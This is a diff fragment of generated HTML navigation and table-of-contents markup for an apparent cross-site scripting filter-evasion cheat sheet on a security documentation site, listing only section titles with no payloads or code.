+  <a href="#end-title-tag" class="md-nav__link">
+    End Title Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#input-image" class="md-nav__link">
+    INPUT Image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body-image" class="md-nav__link">
+    BODY Image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-dynsrc" class="md-nav__link">
+    IMG Dynsrc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-lowsrc" class="md-nav__link">
+    IMG Lowsrc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-style-image" class="md-nav__link">
+    List-style-image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vbscript-in-an-image" class="md-nav__link">
+    VBscript in an Image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#livescript-older-versions-of-netscape-only" class="md-nav__link">
+    Livescript (older versions of Netscape only)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svg-object-tag" class="md-nav__link">
+    SVG Object Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ecmascript-6" class="md-nav__link">
+    ECMAScript 6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body-tag" class="md-nav__link">
+    BODY Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#event-handlers" class="md-nav__link">
+    Event Handlers
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bgsound" class="md-nav__link">
+    BGSOUND
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-includes" class="md-nav__link">
+    &amp; JavaScript includes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-sheet" class="md-nav__link">
+    STYLE sheet
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet" class="md-nav__link">
+    Remote style sheet
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet-part-2" class="md-nav__link">
+    Remote style sheet part 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet-part-3" class="md-nav__link">
+    Remote style sheet part 3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet-part-4" class="md-nav__link">
+    Remote style sheet part 4
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tags-with-broken-up-javascript-for-xss" class="md-nav__link">
+    STYLE Tags with Broken-up JavaScript for XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-attribute-using-a-comment-to-break-up-expression" class="md-nav__link">
+    STYLE Attribute using a Comment to Break-up Expression
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-style-with-expression" class="md-nav__link">
+    IMG STYLE with Expression
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tag-older-versions-of-netscape-only" class="md-nav__link">
+    STYLE Tag (Older versions of Netscape only)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tag-using-background-image" class="md-nav__link">
+    STYLE Tag using Background-image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tag-using-background" class="md-nav__link">
+    STYLE Tag using Background
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-html-with-style-attribute" class="md-nav__link">
+    Anonymous HTML with STYLE Attribute
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-htc-file" class="md-nav__link">
+    Local htc File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#us-ascii-encoding" class="md-nav__link">
+    US-ASCII Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta" class="md-nav__link">
+    META
+  </a>
+  
+    <nav class="md-nav" aria-label="META">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#meta-using-data" class="md-nav__link">
+    META using Data
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta-with-additional-url-parameter" class="md-nav__link">
+    META with Additional URL Parameter
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe" class="md-nav__link">
+    IFRAME
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe-event-based" class="md-nav__link">
+    IFRAME Event Based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frame" class="md-nav__link">
+    FRAME
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#table" class="md-nav__link">
+    TABLE
+  </a>
+  
+    <nav class="md-nav" aria-label="TABLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#td" class="md-nav__link">
+    TD
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div" class="md-nav__link">
+    DIV
+  </a>
+  
+    <nav class="md-nav" aria-label="DIV">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image" class="md-nav__link">
+    DIV Background-image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image-with-unicoded-xss-exploit" class="md-nav__link">
+    DIV Background-image with Unicoded XSS Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image-plus-extra-characters" class="md-nav__link">
+    DIV Background-image Plus Extra Characters
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-expression" class="md-nav__link">
+    DIV Expression
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#downlevel-hidden-block" class="md-nav__link">
+    Downlevel-Hidden Block
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base-tag" class="md-nav__link">
+    BASE Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#object-tag" class="md-nav__link">
+    OBJECT Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embed-a-flash-movie-that-contains-xss" class="md-nav__link">
+    EMBED a Flash Movie That Contains XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embed-svg-which-contains-xss-vector" class="md-nav__link">
+    EMBED SVG Which Contains XSS Vector
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-actionscript-inside-flash-for-obfuscation" class="md-nav__link">
+    Using ActionScript Inside Flash for Obfuscation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-data-island-with-cdata-obfuscation" class="md-nav__link">
+    XML Data Island with CDATA Obfuscation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" class="md-nav__link">
+    Locally hosted XML with embedded JavaScript that is generated using an XML data island
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htmltime-in-xml" class="md-nav__link">
+    HTML+TIME in XML
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" class="md-nav__link">
+    Assuming you can only fit in a few characters and it filters against .js
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssi-server-side-includes" class="md-nav__link">
+    SSI (Server Side Includes)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    PHP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-embedded-commands" class="md-nav__link">
+    IMG Embedded Commands
+  </a>
+  
+    <nav class="md-nav" aria-label="IMG Embedded Commands">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#img-embedded-commands-part-ii" class="md-nav__link">
+    IMG Embedded Commands part II
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-manipulation" class="md-nav__link">
+    Cookie Manipulation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#utf-7-encoding" class="md-nav__link">
+    UTF-7 Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-using-html-quote-encapsulation" class="md-nav__link">
+    XSS Using HTML Quote Encapsulation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-string-evasion" class="md-nav__link">
+    URL String Evasion
+  </a>
+  
+    <nav class="md-nav" aria-label="URL String Evasion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ip-versus-hostname" class="md-nav__link">
+    IP Versus Hostname
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-encoding" class="md-nav__link">
+    URL Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dword-encoding" class="md-nav__link">
+    DWORD Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hex-encoding" class="md-nav__link">
+    Hex Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#octal-encoding" class="md-nav__link">
+    Octal Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base64-encoding" class="md-nav__link">
+    Base64 Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mixed-encoding" class="md-nav__link">
+    Mixed Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#protocol-resolution-bypass" class="md-nav__link">
+    Protocol Resolution Bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-feeling-lucky-part-1" class="md-nav__link">
+    Google "feeling lucky" part 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-feeling-lucky-part-2" class="md-nav__link">
+    Google "feeling lucky" part 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-feeling-lucky-part-3" class="md-nav__link">
+    Google "feeling lucky" part 3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#removing-cnames" class="md-nav__link">
+    Removing CNAMEs
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-link-location" class="md-nav__link">
+    JavaScript Link Location
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-replace-as-attack-vector" class="md-nav__link">
+    Content Replace as Attack Vector
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#assisting-xss-with-http-parameter-pollution" class="md-nav__link">
+    Assisting XSS with HTTP Parameter Pollution
+  </a>
+  
+    <nav class="md-nav" aria-label="Assisting XSS with HTTP Parameter Pollution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#content-page-source-code" class="md-nav__link">
+    Content Page Source Code
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share-page-source-code" class="md-nav__link">
+    Share Page Source Code
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-page-output" class="md-nav__link">
+    Content Page Output
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share-page-output" class="md-nav__link">
+    Share Page Output
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#character-escape-sequences" class="md-nav__link">
+    Character Escape Sequences
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methods-to-bypass-waf-cross-site-scripting" class="md-nav__link">
+    Methods to Bypass WAF – Cross-Site Scripting
+  </a>
+  
+    <nav class="md-nav" aria-label="Methods to Bypass WAF – Cross-Site Scripting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#general-issues" class="md-nav__link">
+    General issues
+  </a>
+  
+    <nav class="md-nav" aria-label="General issues">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stored-xss" class="md-nav__link">
+    Stored XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reflected-xss-in-javascript" class="md-nav__link">
+    Reflected XSS in JavaScript
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-based-xss" class="md-nav__link">
+    DOM-based XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-via-request-redirection" class="md-nav__link">
+    XSS via request Redirection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass-strings-for-xss" class="md-nav__link">
+    WAF ByPass Strings for XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filter-bypass-alert-obfuscation" class="md-nav__link">
+    Filter Bypass Alert Obfuscation
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="npm_Security_CheatSheet.html" class="md-nav__link">
+        npm Security CheatSheet.md
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    Introduction
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tests" class="md-nav__link">
+    Tests
+  </a>
+  
+    <nav class="md-nav" aria-label="Tests">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-xss-test-without-filter-evasion" class="md-nav__link">
+    Basic XSS Test Without Filter Evasion
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-locator-polygot" class="md-nav__link">
+    XSS Locator (Polygot)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#image-xss-using-the-javascript-directive" class="md-nav__link">
+    Image XSS Using the JavaScript Directive
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-quotes-and-no-semicolon" class="md-nav__link">
+    No Quotes and no Semicolon
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#case-insensitive-xss-attack-vector" class="md-nav__link">
+    Case Insensitive XSS Attack Vector
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#html-entities" class="md-nav__link">
+    HTML Entities
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#grave-accent-obfuscation" class="md-nav__link">
+    Grave Accent Obfuscation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malformed-a-tags" class="md-nav__link">
+    Malformed A Tags
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malformed-img-tags" class="md-nav__link">
+    Malformed IMG Tags
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fromcharcode" class="md-nav__link">
+    fromCharCode
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#default-src-tag-to-get-past-filters-that-check-src-domain" class="md-nav__link">
+    Default SRC Tag to Get Past Filters that Check SRC Domain
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#default-src-tag-by-leaving-it-empty" class="md-nav__link">
+    Default SRC Tag by Leaving it Empty
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#default-src-tag-by-leaving-it-out-entirely" class="md-nav__link">
+    Default SRC Tag by Leaving it out Entirely
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#on-error-alert" class="md-nav__link">
+    On Error Alert
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-onerror-and-javascript-alert-encode" class="md-nav__link">
+    IMG onerror and JavaScript Alert Encode
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decimal-html-character-references" class="md-nav__link">
+    Decimal HTML Character References
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decimal-html-character-references-without-trailing-semicolons" class="md-nav__link">
+    Decimal HTML Character References Without Trailing Semicolons
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hexadecimal-html-character-references-without-trailing-semicolons" class="md-nav__link">
+    Hexadecimal HTML Character References Without Trailing Semicolons
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embedded-tab" class="md-nav__link">
+    Embedded Tab
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embedded-encoded-tab" class="md-nav__link">
+    Embedded Encoded Tab
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embedded-newline-to-break-up-xss" class="md-nav__link">
+    Embedded Newline to Break-up XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embedded-carriage-return-to-break-up-xss" class="md-nav__link">
+    Embedded Carriage Return to Break-up XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#null-breaks-up-javascript-directive" class="md-nav__link">
+    Null breaks up JavaScript Directive
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spaces-and-meta-chars-before-the-javascript-in-images-for-xss" class="md-nav__link">
+    Spaces and Meta Chars Before the JavaScript in Images for XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#non-alpha-non-digit-xss" class="md-nav__link">
+    Non-alpha-non-digit XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraneous-open-brackets" class="md-nav__link">
+    Extraneous Open Brackets
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-closing-script-tags" class="md-nav__link">
+    No Closing Script Tags
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#protocol-resolution-in-script-tags" class="md-nav__link">
+    Protocol Resolution in Script Tags
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#half-open-htmljavascript-xss-vector" class="md-nav__link">
+    Half Open HTML/JavaScript XSS Vector
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#double-open-angle-brackets" class="md-nav__link">
+    Double Open Angle Brackets
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escaping-javascript-escapes" class="md-nav__link">
+    Escaping JavaScript Escapes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#end-title-tag" class="md-nav__link">
+    End Title Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#input-image" class="md-nav__link">
+    INPUT Image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body-image" class="md-nav__link">
+    BODY Image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-dynsrc" class="md-nav__link">
+    IMG Dynsrc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-lowsrc" class="md-nav__link">
+    IMG Lowsrc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-style-image" class="md-nav__link">
+    List-style-image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vbscript-in-an-image" class="md-nav__link">
+    VBscript in an Image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#livescript-older-versions-of-netscape-only" class="md-nav__link">
+    Livescript (older versions of Netscape only)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svg-object-tag" class="md-nav__link">
+    SVG Object Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ecmascript-6" class="md-nav__link">
+    ECMAScript 6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#body-tag" class="md-nav__link">
+    BODY Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#event-handlers" class="md-nav__link">
+    Event Handlers
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bgsound" class="md-nav__link">
+    BGSOUND
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-includes" class="md-nav__link">
+    &amp; JavaScript includes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-sheet" class="md-nav__link">
+    STYLE sheet
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet" class="md-nav__link">
+    Remote style sheet
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet-part-2" class="md-nav__link">
+    Remote style sheet part 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet-part-3" class="md-nav__link">
+    Remote style sheet part 3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-style-sheet-part-4" class="md-nav__link">
+    Remote style sheet part 4
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tags-with-broken-up-javascript-for-xss" class="md-nav__link">
+    STYLE Tags with Broken-up JavaScript for XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-attribute-using-a-comment-to-break-up-expression" class="md-nav__link">
+    STYLE Attribute using a Comment to Break-up Expression
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-style-with-expression" class="md-nav__link">
+    IMG STYLE with Expression
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tag-older-versions-of-netscape-only" class="md-nav__link">
+    STYLE Tag (Older versions of Netscape only)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tag-using-background-image" class="md-nav__link">
+    STYLE Tag using Background-image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#style-tag-using-background" class="md-nav__link">
+    STYLE Tag using Background
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-html-with-style-attribute" class="md-nav__link">
+    Anonymous HTML with STYLE Attribute
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-htc-file" class="md-nav__link">
+    Local htc File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#us-ascii-encoding" class="md-nav__link">
+    US-ASCII Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta" class="md-nav__link">
+    META
+  </a>
+  
+    <nav class="md-nav" aria-label="META">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#meta-using-data" class="md-nav__link">
+    META using Data
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#meta-with-additional-url-parameter" class="md-nav__link">
+    META with Additional URL Parameter
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe" class="md-nav__link">
+    IFRAME
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iframe-event-based" class="md-nav__link">
+    IFRAME Event Based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frame" class="md-nav__link">
+    FRAME
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#table" class="md-nav__link">
+    TABLE
+  </a>
+  
+    <nav class="md-nav" aria-label="TABLE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#td" class="md-nav__link">
+    TD
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div" class="md-nav__link">
+    DIV
+  </a>
+  
+    <nav class="md-nav" aria-label="DIV">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image" class="md-nav__link">
+    DIV Background-image
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image-with-unicoded-xss-exploit" class="md-nav__link">
+    DIV Background-image with Unicoded XSS Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-background-image-plus-extra-characters" class="md-nav__link">
+    DIV Background-image Plus Extra Characters
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#div-expression" class="md-nav__link">
+    DIV Expression
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#downlevel-hidden-block" class="md-nav__link">
+    Downlevel-Hidden Block
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base-tag" class="md-nav__link">
+    BASE Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#object-tag" class="md-nav__link">
+    OBJECT Tag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embed-a-flash-movie-that-contains-xss" class="md-nav__link">
+    EMBED a Flash Movie That Contains XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#embed-svg-which-contains-xss-vector" class="md-nav__link">
+    EMBED SVG Which Contains XSS Vector
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-actionscript-inside-flash-for-obfuscation" class="md-nav__link">
+    Using ActionScript Inside Flash for Obfuscation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-data-island-with-cdata-obfuscation" class="md-nav__link">
+    XML Data Island with CDATA Obfuscation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" class="md-nav__link">
+    Locally hosted XML with embedded JavaScript that is generated using an XML data island
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#htmltime-in-xml" class="md-nav__link">
+    HTML+TIME in XML
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" class="md-nav__link">
+    Assuming you can only fit in a few characters and it filters against .js
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssi-server-side-includes" class="md-nav__link">
+    SSI (Server Side Includes)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    PHP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#img-embedded-commands" class="md-nav__link">
+    IMG Embedded Commands
+  </a>
+  
+    <nav class="md-nav" aria-label="IMG Embedded Commands">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#img-embedded-commands-part-ii" class="md-nav__link">
+    IMG Embedded Commands part II
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-manipulation" class="md-nav__link">
+    Cookie Manipulation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#utf-7-encoding" class="md-nav__link">
+    UTF-7 Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-using-html-quote-encapsulation" class="md-nav__link">
+    XSS Using HTML Quote Encapsulation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-string-evasion" class="md-nav__link">
+    URL String Evasion
+  </a>
+  
+    <nav class="md-nav" aria-label="URL String Evasion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ip-versus-hostname" class="md-nav__link">
+    IP Versus Hostname
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-encoding" class="md-nav__link">
+    URL Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dword-encoding" class="md-nav__link">
+    DWORD Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hex-encoding" class="md-nav__link">
+    Hex Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#octal-encoding" class="md-nav__link">
+    Octal Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base64-encoding" class="md-nav__link">
+    Base64 Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mixed-encoding" class="md-nav__link">
+    Mixed Encoding
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#protocol-resolution-bypass" class="md-nav__link">
+    Protocol Resolution Bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-feeling-lucky-part-1" class="md-nav__link">
+    Google "feeling lucky" part 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-feeling-lucky-part-2" class="md-nav__link">
+    Google "feeling lucky" part 2
+  </a>
+  
+</li>
+        
